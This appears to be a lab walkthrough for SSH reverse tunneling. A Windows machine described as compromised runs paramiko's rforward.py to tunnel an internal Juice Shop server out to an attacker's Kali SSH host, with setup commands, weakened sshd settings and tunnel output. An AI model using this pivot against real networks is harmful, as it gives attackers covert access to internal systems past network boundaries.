# SSH-reverse-tunneling
Here we simulate traffic tunneling from the attacked network (where the Windows machine is already compromised (acts as a mediator) and the Web server (victim/target machine - Debian) are located within the same network, and the Windows machine has access to the Web server) to an SSH server located outside the attacked network. 

#### NOTE: Under the right circumstances, we can open the RDP port to work with the internal system via Remote Desktop.  

Plan:
- We want to gain access to the Web-Server(Debian) from our Kali machine; 
- The Web-server is unreachable for Kali machine in a direct way;
- But the compromised Windows machine is being run our python script.

# 1. KALI-MACHINE(acts as SSH-server) PREPARATION
## 1.1 Make sure your Kali machine's SSH-server is being run: 
```bash
sudo apt-get install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
```
## 1.2 In order to simplify the demonstration(don't forget to reset them when you're done), edit the /etc/ssh/sshd_config file:
```bash
sudo nano /etc/ssh/sshd_config
```
Flag them like this:
```bash
PubkeyAuthentication no           # It should accept password authentication or key-based auth. 
PasswordAuthentication yes

AllowTcpForwarding yes            # Optionally, configure SSH to permit port forwarding.
```
Then: 
```bash
service sshd restart
```
# 2. WEB SERVER(Debian-like) PREPARATIONS
## 2.1 Optionally, add a mirror source(http://kali.mirror.garr.it/mirrors/kali ):
```bash
sudo nano /etc/apt/sources.list
```
## 2.2 Install SSH:
```bash
sudo apt-get install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
```
## 2.3 Install Docker and OWASP Juice Shop App:
```bash
sudo apt install docker.io
sudo apt install docker-compose
sudo docker pull bkimminich/juice-shop
sudo docker run --rm -p 192.168.204.144:3000:3000 bkimminich/juice-shop
```
## 2.4 If the script doesn't want to work, try these:
```bash
sudo ufw allow 3000/tcp 
sudo ufw status
```
Just in case, if you want to undo:
```bash
sudo ufw status numbered 
sudo ufw delete 1 
sudo ufw delete allow 3000/tcp
```
### 2.4.1 Also can help flagging it like this:
```bash
sudo nano /etc/ssh/sshd_config
```
Flags:
```bash
Port 22
ListenAddress 0.0.0.0
PublicAuthentication no
PasswordAuthentication yes
AllowTcpForwarding yes
```
# 3. WINDOWS MACHINE(runs the script PREPARATION:
## 1. Download 'rforward' https://github.com/paramiko/paramiko/blob/main/demos/rforward.py
## 2. Run it:
```bash
python rforward.py 192.168.204.139 -p 8081 -r 192.168.204.144:3000 --user=kali --password
```
CLIENT OUTPUT:
```bash
Enter SSH password: 
Connecting to ssh host 192.168.204.139:22 ...
Now forwarding remote port 8081 to 192.168.204.144:3000 ...

Connected!  Tunnel open ('127.0.0.1', 49450) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49462) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49458) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49466) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49468) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49478) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Connected!  Tunnel open ('127.0.0.1', 49486) -> ('192.168.204.139', 22) -> ('192.168.204.144', 3000)
Tunnel closed from ('127.0.0.1', 49458)
Tunnel closed from ('127.0.0.1', 49450)
Tunnel closed from ('127.0.0.1', 49468)
Tunnel closed from ('127.0.0.1', 49466)
Tunnel closed from ('127.0.0.1', 49478)
Tunnel closed from ('127.0.0.1', 49462)
```
